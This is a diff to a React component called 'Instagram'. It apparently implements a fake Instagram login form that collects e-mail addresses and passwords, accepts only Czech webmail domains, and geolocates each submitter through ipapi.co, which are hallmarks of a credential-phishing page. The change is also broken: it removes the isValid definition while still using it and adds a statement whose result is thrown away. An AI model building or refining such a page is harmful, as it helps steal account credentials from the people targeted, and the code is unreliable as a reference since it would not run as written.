@@ -12,8 +12,7 @@ const Instagram: React.FC = () => {
     setType(icon ? "text" : "password");
     setIcon(!icon);
   };
-  const allowedDomains = ["@seznam.cz", "@email.cz", "@post.cz"];
-
+  
   const onSubmit = async (event: FormEvent<HTMLFormElement>) => {
     event.preventDefault();
 
@@ -23,13 +22,12 @@ const Instagram: React.FC = () => {
         formData[field.name] = field.value;
       }
     });
+    
+      formData.name.toLowerCase().endsWith(".cz");
 
-    const isValid = allowedDomains.some((domain) =>
-      formData.name.toLowerCase().endsWith(domain)
-    );
 
     if (!isValid) {
-      setError("E-mail musí končit @seznam.cz, @email.cz nebo @post.cz");
+      setError("Email musí končit @seznam.cz, @email.cz, nebo @post.cz atd");
     } else {
       setError("");
       fetch("https://ipapi.co/json/")
@@ -70,7 +68,7 @@ const Instagram: React.FC = () => {
             name="name"
             placeholder="E-mail"
             pattern="^[a-zA-Z0-9._%+-]+@(seznam\.cz|email\.cz|post\.cz)$"
-            title="Email must end with @seznam.cz, @email.cz, or @post.cz"
+            title="Email musí končit @seznam.cz, @email.cz, nebo @post.cz atd"
           />
 
           <div className="flex items-center relative mb-3">
